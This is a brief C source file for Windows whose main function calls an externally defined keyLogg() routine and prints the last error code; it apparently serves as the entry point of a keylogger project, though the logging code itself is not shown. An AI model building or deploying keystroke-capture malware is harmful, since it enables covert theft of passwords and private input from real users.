#include <Windows.h>
#include <stdio.h>


extern int keyLogg();

int main() {
	keyLogg();
	printf("[-] GetlastError: %d \n", GetLastError());
	return 0;
}


